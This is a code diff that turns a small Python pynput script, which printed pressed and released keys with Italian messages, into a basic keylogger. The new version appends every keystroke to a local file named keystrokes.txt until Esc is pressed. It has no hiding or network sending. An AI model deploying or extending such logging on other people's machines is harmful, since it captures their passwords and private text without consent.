@@ -1,15 +1,25 @@
-from pynput.keyboard import Key,Listener 
-def premuto(key):
+import pynput
+from pynput.keyboard import Key, Listener
+
+log_file = "keystrokes.txt"
+
+def on_press(key):
     try:
-        print(f"Tasto premuto{key.char}")
-    except:
-        print(f"Tasto speciale premuto{key}")
+        with open(log_file, "a") as f:
+            f.write(f"{key}\n")
+    except Exception as e:
+        print(f"Error writing to log file: {e}")
 
-def rilasciato(key):
-    print(f"Tasto rilasciato{key}")
-    if key==Key.esc:             #se tasto premuto ESC si stoppa 
+def on_release(key):
+    if key == Key.esc:
         return False
-    
 
-with Listener(on_press=premuto, on_release=rilasciato) as listener:
-    listener.join()
+def main():
+    try:
+        with Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+    except Exception as e:
+        print(f"Error in listener: {e}")
+
+if __name__ == "__main__":
+    main()
